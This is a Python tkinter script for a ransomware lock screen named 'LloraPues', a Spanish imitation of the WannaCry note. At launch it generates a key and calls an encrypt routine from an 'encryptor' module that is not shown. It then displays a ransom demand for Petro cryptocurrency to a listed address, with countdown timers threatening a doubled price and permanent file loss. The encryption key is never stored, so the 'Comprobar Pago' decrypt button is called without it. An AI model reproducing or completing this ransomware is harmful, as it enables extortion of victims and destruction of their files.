import tkinter as tk
import tkinter.scrolledtext as st
from datetime import datetime
from encryptor import encrypt, decrypt
from cryptography.fernet import Fernet

KEY = Fernet.generate_key()

BG_COLOR = "#850a0a"

root = tk.Tk()
root.geometry("800x600")
root.title("LloraPues")
root.configure(bg=BG_COLOR)


root.columnconfigure(0, weight=2)
root.columnconfigure(1, weight=15)
root.rowconfigure(0, weight=1)

left_frame = tk.Frame(root)
left_frame.config(bg=BG_COLOR, padx=10, pady=10)
left_frame.rowconfigure(0, weight=1)
left_frame.rowconfigure(1, weight=1)
left_frame.rowconfigure(2, weight=1)
left_frame.rowconfigure(3, weight=1)
left_frame.columnconfigure(0, weight=1)
left_frame.grid(row=0, column=0, sticky="nswe")


def days_between(d1, d2):
    diferencia = d2 - d1
    resultado = f"{diferencia.days}:{diferencia.seconds // 3600}:{(diferencia.seconds // 60) % 60}:{diferencia.seconds % 60}"
    return resultado


def update_label_price(label):
    price_increase = datetime(2024, 10, 17, 13, 32, 52)
    new_text = days_between(datetime.now(), price_increase)
    label.configure(text=new_text)
    label.after(1000, update_label_price, label)


def update_label_delete(label):
    delete_time = datetime(2024, 10, 21, 13, 32, 52)
    new_text = days_between(datetime.now(), delete_time)
    label.configure(text=new_text)
    label.after(1000, update_label_delete, label)


def time_frame(title, date, time, row_pos, sticky, update_label):
    time_frame = tk.Frame(left_frame)
    time_frame.config(bg=BG_COLOR, highlightbackground="white", highlightthickness=1)
    time_frame.columnconfigure(0, weight=1)
    time_frame.rowconfigure(0, weight=1)
    time_frame.rowconfigure(1, weight=8)
    time_frame.rowconfigure(2, weight=1)
    time_frame.rowconfigure(3, weight=2)
    time_frame.grid(row=row_pos, column=0, sticky=sticky)

    time_frame_title = tk.Label(
        time_frame,
        text=title,
        bg=BG_COLOR,
        pady=10,
        fg="yellow",
        font=("Arial", 11),
    )
    time_frame_date = tk.Label(
        time_frame,
        text=f"{date} {time}",
        bg=BG_COLOR,
        padx=10,
        pady=10,
        fg="white",
        font=("Arial", 9),
    )
    remaining_time_title = tk.Label(
        time_frame,
        text="Time Left",
        bg=BG_COLOR,
        fg="white",
        font=("Arial", 9),
    )
    remaining_time = tk.Label(
        time_frame,
        text="",
        bg=BG_COLOR,
        fg="white",
        font=("Arial", 20),
    )

    update_label(remaining_time)

    time_frame_title.grid(row=0, column=0)
    time_frame_date.grid(row=1, column=0)
    remaining_time_title.grid(row=2, column=0)
    remaining_time.grid(row=3, column=0)


right_frame = tk.Frame(root)
right_frame.config(bg=BG_COLOR, padx=10, pady=10)
right_frame.rowconfigure(0, weight=1)
right_frame.rowconfigure(2, weight=8)
right_frame.rowconfigure(3, weight=4)
right_frame.columnconfigure(0, weight=1)
right_frame.grid(row=0, column=1, sticky="nswe")


title = tk.Label(
    right_frame,
    text="Ups, tus archivos se encriptaron solos",
    bg=BG_COLOR,
    pady=10,
    fg="white",
    font=("Arial", 16, "bold"),
)
title.grid(row=0, column=0)

text_area = st.ScrolledText(
    right_frame, width=50, height=20, font=("Times New Roman", 11)
)

text_area.insert(
    tk.INSERT,
    """
¿Qué pasó con mi computadora?
Tus archivos importantes están encriptados.
cualquiera de sus documentos, fotos, videos, bases de datos y otros archivos ya no están
accesibles porque han sido cifrados. Tal vez estés ocupado buscando una manera de
Recupera tus archivos, pero no pierdas el tiempo. Nadie puede recuperar tus archivos sin
Nuestro servicio de descifrado.

¿Recuperar mis archivos?
Claro. Le garantizamos que podrá recuperar todos sus archivos de forma segura y sencilla pero 
no tienes mucho tiempo.
Sólo tienes 3 días para realizar el pago. Después de eso el precio se duplicará.
o, si no paga en 7 días, no podrá recuperar sus archivos para siempre.
Tendremos eventos gratuitos para usuarios que son tan pobres que no pudieron pagar en 6 meses.

¿Cómo debo pagar?
El pago solo se acepta en Petro.,
Lea el precio actual del Petro y compre algunos Petro.
Tras enviar la cantidad correcta a 0341785ad879c1814339f29ae35f7419a35a10e29e976c46f462323e65ce02a5ae
Después de su pago, haga clic en <Verificar pago>. Mejor hora para checkear: 9:00 a. m. - 11:00 a. m.
""",
)
text_area.grid(column=0, row=1, padx=10, pady=10)
text_area.configure(state="disabled")

btn = tk.Button(right_frame, text="Comprobar Pago", command=decrypt)

btn.grid(row=3, column=0)


time_frame(
    "Los pagos aumentaran el", "17/10/2024", "13:32:52", 1, "swe", update_label_price
)
time_frame(
    "Tus archivos se perderan en",
    "21/10/2024",
    "13:32:52",
    2,
    "nwe",
    update_label_delete,
)

encrypt(key=KEY)
root.mainloop()
